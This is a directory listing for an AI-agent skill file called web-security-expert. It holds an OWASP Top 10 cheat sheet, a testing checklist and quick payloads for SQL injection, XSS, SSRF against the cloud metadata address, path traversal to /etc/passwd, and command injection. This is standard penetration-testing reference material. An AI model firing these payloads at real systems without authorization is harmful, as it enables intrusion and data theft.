---
rating: ⭐⭐⭐
title: web-security-expert
url: https://skills.sh/duck4nh/antigravity-kit/web-security-expert
---

# web-security-expert

skills/duck4nh/antigravity-kit/web-security-expert
web-security-expert
Installation
$ npx skills add https://github.com/duck4nh/antigravity-kit --skill web-security-expert
SKILL.md
Web Security Expert
OWASP Top 10 Quick Reference
Vuln	Test	Payload Example
SQLi	', ", 1 OR 1=1	' UNION SELECT null,username,password FROM users--
XSS	<script>, event handlers	<img src=x onerror=alert(1)>
SSRF	Internal URLs	http://127.0.0.1, http://169.254.169.254
IDOR	Change IDs	/api/user/123 → /api/user/124
LFI	Path traversal	../../../etc/passwd
RCE	Command chars	; id, `
Testing Checklist
Authentication
 Brute force protection
 Password reset flaws
 Session fixation
 JWT vulnerabilities
Authorization
 IDOR on all endpoints
 Privilege escalation
 Missing function level access
Input Validation
 SQLi all parameters
 XSS reflected/stored
 Command injection
 File upload bypass
Quick Payloads
# SQLi
' OR '1'='1
' UNION SELECT null,null,null--
'; WAITFOR DELAY '0:0:5'--

# XSS
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
javascript:alert(1)

# SSRF
http://127.0.0.1:80
http://[::]:80
http://169.254.169.254/latest/meta-data/

# LFI
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd

Tools
Purpose	Tool
Proxy	Burp Suite, OWASP ZAP
SQLi	sqlmap
XSS	XSStrike, dalfox
Fuzzing	ffuf, wfuzz
Weekly Installs
42
Repository
duck4nh/antigravity-kit
GitHub Stars
16
First Seen
Today
Security Audits
Gen Agent Trust HubPass
SocketPass
SnykFail